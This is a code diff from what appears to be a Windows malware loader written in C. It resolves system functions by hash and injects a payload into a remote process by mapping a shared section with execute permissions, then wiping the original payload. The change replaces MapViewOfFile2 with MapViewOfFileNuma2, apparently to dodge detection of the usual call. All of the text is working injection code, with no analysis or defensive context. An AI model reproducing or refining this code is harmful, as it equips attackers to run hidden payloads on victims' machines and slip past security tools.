@@ -11,15 +11,16 @@
 
 
 BOOL memory_load_apis() {
+
 	g_ldr->apis->OpenProcess        = (pOpenProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_OPENPROCESS);
 	g_ldr->apis->CreateFileMappingA = (pCreateFileMappingA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATESECTION);
 
 	g_ldr->apis->MapViewOfFile      = (pMapViewOfFile)GetProc(g_ldr->apis->modules.kernel32, HASHED_MAPVIEWOFFILE);
-	g_ldr->apis->MapViewOfFile2     = (pMapViewOfFile2)GetProc(g_ldr->apis->modules.kernelBase, HASHED_MAPVIEWOFFILE2);
+	g_ldr->apis->MapViewOfFileNuma2 = (pMapViewOfFileNuma2)GetProc(g_ldr->apis->modules.kernelBase, HASHED_MAPVIEWOFFILENUMA2);
 	g_ldr->apis->UnmapViewOfFile    = (pUnmapViewOfFile)GetProc(g_ldr->apis->modules.kernel32, HASHED_UNMAPVIEWOFFILE);
 	g_ldr->apis->CloseHandle        = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
 
-	if (g_ldr->apis->OpenProcess == NULL || g_ldr->apis->CreateFileMappingA == NULL || g_ldr->apis->MapViewOfFile2 == NULL || g_ldr->apis->MapViewOfFile == NULL) {
+	if (g_ldr->apis->OpenProcess == NULL || g_ldr->apis->CreateFileMappingA == NULL || g_ldr->apis->MapViewOfFileNuma2 == NULL || g_ldr->apis->MapViewOfFile == NULL) {
 		return FALSE;
 	}
 	return TRUE;
@@ -53,7 +54,7 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 	memcpy(local, PayloadAddress, PayloadSize);
 	clear_payload(PayloadAddress, PayloadSize);
 	
-	PVOID remote = g_ldr->apis->MapViewOfFile2(hFile, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
+	PVOID remote = g_ldr->apis->MapViewOfFileNuma2(hFile, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ, NUMA_NO_PREFERRED_NODE);
 	if (remote == NULL) {
 		DBGA("[!] Failed Mapping Section Remotely | %lu\n", GetLastError());
 		g_ldr->apis->UnmapViewOfFile(local);
